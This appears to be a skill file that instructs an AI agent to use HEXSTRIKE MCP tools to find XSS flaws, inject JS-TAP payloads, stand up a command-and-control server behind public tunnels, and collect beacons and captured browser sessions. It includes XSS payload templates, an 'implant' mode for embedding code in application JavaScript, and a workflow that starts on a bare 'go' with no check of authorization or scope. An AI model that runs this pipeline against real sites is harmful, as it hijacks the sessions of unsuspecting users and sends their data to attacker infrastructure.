---
name: hexstrike-jstap
description: >
  Automates the full JS-TAP XSS C2 testing pipeline through HEXSTRIKE MCP tools.
  Use this skill whenever the user mentions JS-TAP, wants to test XSS vulnerabilities
  with a C2 callback, run an XSS full chain, automate beacon collection, inject
  payloads into a target app or platform, or use phrases like "test JS-TAP",
  "run JS-TAP workflow", "JS-TAP XSS chain", "automate jstap", "run xss chain
  against", "full XSS pipeline", or "hexstrike jstap". Also trigger when the user
  wants to combine recon + XSS discovery + C2 implant delivery in one automated flow.
  Always use this skill when HEXSTRIKE + JS-TAP are mentioned together.
---

# HEXSTRIKE JS-TAP Automation Workflow

You are orchestrating the full JS-TAP XSS C2 pipeline using HEXSTRIKE MCP tools.
Your job is to guide the user from target selection through active beacon collection,
using the right tool at each stage and reporting clearly along the way.

---

## Before You Start -- Collect What You Need

If the user hasn't already provided them, ask for these before running anything:

| Info | Required? | Default |
|---|---|---|
| Target URL | Yes | -- |
| Vulnerable parameter name | Yes | `q` if scanning first |
| Injection point | No | `url_param` |
| HTTP method | No | `GET` |
| Session cookies | No | none |
| Extra form/URL params | No | none |
| Tunnel provider | No | `auto` |
| Payload mode | No | `trap` |
| Want recon/scan first? | No | skip if URL+param known |

Don't ask for everything at once -- if the user gives a URL and says "go", start with
recon or a scan to find the parameter, then confirm before injecting.

---

## Workflow Paths

Choose the right path based on what the user already knows:

### Path A -- Known Vulnerable Target (Fastest)

Use when the user already knows the URL, parameter, and injection point.

```
xss_full_chain(
  target_url, injection_point, param_name, method,
  payload_mode="trap", tunnel_provider="auto"
)
```

This single call:
1. Starts JS-TAP C2 on port 8444
2. Launches a tunnel (ngrok/cloudflared/serveo auto-detected)
3. Generates the payload using the tunnel's public URL
4. Injects it into the target parameter
5. Starts the beacon listener

After it completes, call `jstap_server_status()` to show the portal URL and confirm
the beacon listener is active.

---

### Path B -- Need to Find XSS Vectors First

Use when the user has a target but doesn't know which parameter is vulnerable.

Step 1 -- Scan with Dalfox:
```
dalfox_xss_scan(url=target_url, blind=True)
```
Dalfox will find reflected/stored XSS vectors. Review the output and identify the
vulnerable parameter(s) before proceeding.

Step 2 -- Full chain with discovered param:
```
xss_full_chain(target_url, param_name=<discovered>, ...)
```

---

### Path C -- Full Recon + XSS Hunt + C2 (Deep Engagement)

Use for a full app pentest or bug bounty workflow against a domain.

Step 1 -- Recon:
```
bugbounty_reconnaissance_workflow(domain=target_domain)
```
Returns subdomains, endpoints, and interesting attack surface. Review with the user
and let them pick which endpoints to target.

Step 2 -- XSS Scan on prioritized endpoints:
```
dalfox_xss_scan(url=endpoint)
```

Step 3 -- Full chain against confirmed XSS:
```
xss_full_chain(target_url, param_name=<confirmed>, ...)
```

---

## Modular Alternative (Manual Control)

If the user wants step-by-step control rather than the full chain:

```
Step 1:
jstap_launch_with_tunnel(port=8444, provider="auto", payload_mode="trap")
-- returns public URL + payload variants

Step 2:
xss_auto_inject(
  target_url, payload=<from step 1>,
  injection_point, param_name, method, cookies
)
-- confirms payload reflected in response

Step 3:
jstap_server_status()
-- shows portal URL, confirms beacons incoming
```

Use this path when the user wants to choose a specific payload variant before
injecting (script_tag vs img_onerror vs svg_onload), or when testing multiple
injection points separately.

---

## Tunnel Provider Guide

| Provider | Best For | Notes |
|---|---|---|
| `auto` | Most cases | Tries ngrok -> cloudflared -> serveo |
| `cloudflared` | No account needed | Always free, reliable |
| `ngrok` | Stable subdomains | Needs auth token for persistence |
| `serveo` | No install | SSH-based, may be unreliable |

If the user has a `jstap_url` (e.g. already has a public C2 server), pass it
directly to `xss_full_chain` and skip the tunnel entirely.

---

## Payload Modes

| Mode | Use When |
|---|---|
| `trap` | Classic XSS -- loads telemlib.js via iframe, persists in session |
| `implant` | You have write access to JS files -- embed directly in app code |

Trap mode is the default for black-box testing. Implant mode is for scenarios
where you can modify existing JavaScript (supply chain testing, insider threat sim).

---

## Reporting Results

After each major stage, report clearly:

After jstap_full_chain / jstap_launch_with_tunnel:
- [OK] or [FAIL] JS-TAP C2 started (PID, port)
- [OK] or [FAIL] Tunnel established (provider, public URL)
- Payload variants generated (list them)

After xss_auto_inject:
- HTTP status code
- Whether payload was reflected in the response
- The injected URL (for manual verification in browser)
- curl command for reproduction

After jstap_server_status:
- Portal URL (where to monitor captured sessions)
- Running status + uptime
- Next steps: open portal in browser, wait for beacon callbacks

Final summary format:

```
## JS-TAP XSS Chain Results

Target:     <url>
Parameter:  <param> (<method>)
C2 URL:     <tunnel_url>
Portal:     <jstap_portal_url>

Stage Results
| Stage       | Status | Notes                          |
|-------------|--------|-------------------------------|
| JS-TAP C2   | OK     | PID 1234, port 8444           |
| Tunnel      | OK     | cloudflared -> https://...    |
| Payload Gen | OK     | 3 variants, trap mode         |
| Injection   | OK     | HTTP 200, payload reflected   |
| Beacon      | OK     | Listener active               |

Payloads Generated
- script_tag:  <script src="https://..."></script>
- img_onerror: <img src=x onerror="...">
- svg_onload:  <svg onload="...">

Next Steps
1. Visit <portal_url> to monitor captured sessions
2. Trigger the XSS in a browser to confirm callback
3. Call jstap_stop_server() when done
```

---

## Cleanup

When the user is done, remind them to stop the server and tunnel:
```
jstap_stop_server()
tunnel_stop()
```

---

## Error Handling

| Error | Likely Cause | Fix |
|---|---|---|
| JS-TAP start failed | tools/jstap/ not found | Pass jstap_dir with full path |
| Tunnel failed | No tunnel client installed | Try provider="serveo" (no install needed) |
| Payload not reflected | WAF blocking or wrong param | Try different injection point or scan first |
| HEXSTRIKE server unreachable | Server not started | Run python hexstrike_server.py first |

If JS-TAP can't be found automatically, ask the user for the path to their
jsTapServer.py file and pass it as jstap_dir.
